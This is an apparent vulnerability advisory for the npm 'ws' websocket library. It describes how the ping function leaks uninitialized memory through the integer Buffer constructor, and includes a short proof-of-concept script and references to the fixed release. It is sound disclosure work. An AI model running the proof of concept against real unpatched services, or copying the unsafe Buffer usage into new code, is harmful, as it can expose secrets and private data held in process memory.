## Overview
[`ws`](https://www.npmjs.com/package/ws) is a simple to use websocket client, server and console for node.js.
Affected versions of the package are vulnerable to Uninitialized Memory Exposure.

A client side memory disclosure vulnerability exists in ping functionality of the ws service. When a client sends a ping request and provides an integer value as ping data, it will result in leaking an uninitialized memory buffer.

This is a result of unobstructed use of the `Buffer` constructor, whose [insecure default constructor increases the odds of memory leakage](https://snyk.io/blog/exploiting-buffer/).

## Details
Constructing a `Buffer` class with integer `N` creates a `Buffer` of length `N` with raw (not "zero-ed") memory.

In the following example, the first call would allocate 100 bytes of memory, while the second example will allocate the memory needed for the string "100":
```javascript
// uninitialized Buffer of length 100
x = new Buffer(100);
// initialized Buffer with value of '100'
x = new Buffer('100');
```

This would allocate 100 bytes of memory in the first example and just 3 bytes with 100 as value in the second example.

`ws`'s `ping` function uses the default `Buffer` constructor as-is, making it easy to append uninitialized memory to an existing list. If the value of the buffer list is exposed to users, it may expose raw memory, potentially holding secrets, private data and code. 

**Proof of Concept:**
```javascript
var ws = require('ws')

var server = new ws.Server({ port: 9000 })
var client = new ws('ws://localhost:9000')

client.on('open', function () {
  console.log('open')
  client.ping(50) // this makes the client allocate an uninitialized buffer of 50 bytes and send it to the server

  client.on('pong', function (data) {
    console.log('got pong')
    console.log(data)
  })
})
```

You can read more about the insecure `Buffer` behavior [on our blog](https://snyk.io/blog/exploiting-buffer/).

Similar vulnerabilities were discovered in [request](https://snyk.io/vuln/npm:request:20160119), [mongoose](https://snyk.io/vuln/npm:mongoose:20160116), [ws](https://snyk.io/vuln/npm:ws:20160104) and [sequelize](https://snyk.io/vuln/npm:sequelize:20160115).

## References
- https://github.com/websockets/ws/releases/tag/1.0.1
- https://github.com/nodejs/node-v0.x-archive/issues/4525
